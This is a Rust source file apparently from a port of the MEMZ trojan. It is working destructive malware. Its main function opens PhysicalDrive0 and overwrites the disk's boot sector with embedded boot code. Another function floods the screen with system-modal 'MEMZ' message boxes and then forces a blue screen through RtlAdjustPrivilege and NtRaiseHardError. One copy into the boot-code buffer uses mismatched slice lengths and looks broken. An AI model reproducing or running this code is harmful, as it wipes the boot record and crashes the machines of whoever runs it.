#![allow(dead_code)]

use memz_rs::{
    convert_str::ToPCSTRWrapper,
    data::{
        code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
        msg::MSGS,
    },
    ntdll::{
        library::Library,
        ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
    },
    payloads::system::msg_box_hook,
    utils::log,
    utils::log::{write_log, LogLocation, LogType},
    winapi_type::DWORD,
    wrap_windows_api::*,
    LMEM_ZEROINIT,
};
use rand::Rng;
use std::{
    thread::{self, sleep},
    time::Duration,
};
use windows::Win32::{
    Foundation::{
        GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND, LPARAM, LRESULT,
        NTSTATUS, WPARAM,
    },
    Graphics::Gdi::HFONT,
    Storage::FileSystem::{
        WriteFile, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
    },
    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
};

struct Clean {
    main_window: HWND,
    font: HFONT,
    dialog: HWND,
}

fn kill_windows() -> Result<(), WinError> {
    for _ in 0..20 {
        let rip_message_thread = thread::spawn(move || -> Result<(), WinError> {
            let hook = wrap_set_windows_hook_ex_a(
                WH_CBT,
                Some(msg_box_hook),
                HMODULE(0_isize),
                wrap_get_current_thread_id(),
            )?;
            let mut rng = rand::thread_rng();
            let random = rng.gen_range(0..=25);
            wrap_messagebox_a(
                HWND(Default::default()),
                *MSGS[random as usize].to_pcstr(),
                "MEMZ",
                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
            )?;
            wrap_unhook_windows_hook_ex(hook)?;
            Ok(())
        });
        rip_message_thread.join().unwrap().unwrap();
        sleep(Duration::from_millis(100));
    }

    kill_windows_instant()?;
    Ok(())
}

fn kill_windows_instant() -> Result<(), WinError> {
    // Try to force BSOD first
    // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
    // This isn't even an exploit, it's just an undocumented feature.
    let mut tmp1 = 0;
    let mut tmp2 = 0;
    let lib = Library::new("ntdll.dll");
    let rtl_adjust_privilege_proc: Option<RtlAdjustPrivilegeFn> =
        lib.get_proc("RtlAdjustPrivilege");

    match rtl_adjust_privilege_proc {
        Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
        None => {
            write_log(
                LogType::ERROR,
                LogLocation::LOG,
                "Failed GetProc RtlAdjustPrivilege",
            );
            panic!("Failed GetProc RtlAdjustPrivilege")
        }
    };

    let nt_raise_hard_error_proc: Option<NtRaiseHardErrorFn> = lib.get_proc("NtRaiseHardError");

    match nt_raise_hard_error_proc {
        Some(nt_raise_hard_error) => {
            nt_raise_hard_error(NTSTATUS(0xc0000022_u32 as i32), 0, 0, 0, 6, &mut tmp2)
        }
        None => {
            write_log(
                LogType::ERROR,
                LogLocation::LOG,
                "Failed GetProc NtRaiseHardError",
            );
            panic!("Failed GetProc NtRaiseHardError")
        }
    };

    Ok(())
}

fn main() -> Result<(), WinError> {
    log::new_log();
    let _res = Resolution::default();

    let drive = wrap_create_file_a(
        *"\\\\.\\PhysicalDrive0".to_pcstr(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES::default(),
        HANDLE::default(),
    )
    .unwrap();

    let mut boot_code = vec![LMEM_ZEROINIT; 65536];

    boot_code[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]); // Copy code1 in boot_code
    boot_code[..CODE1_LEN + CODE2_LEN + 0x1fe].copy_from_slice(&CODE2[..CODE2_LEN]); // Copy code2 in boot_code

    let mut wb: DWORD = Default::default();

    if !unsafe { WriteFile(drive, Some(&boot_code), Some(&mut wb), None).as_bool() } {
        #[cfg(not(feature = "DEBUG_MODE"))]
        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
            GetLastError()
        });

        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::ALL,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(drive)?;

    Ok(())
}

unsafe extern "system" fn window_proc(_: HWND, _: u32, _: WPARAM, _: LPARAM) -> LRESULT {
    todo!()
}
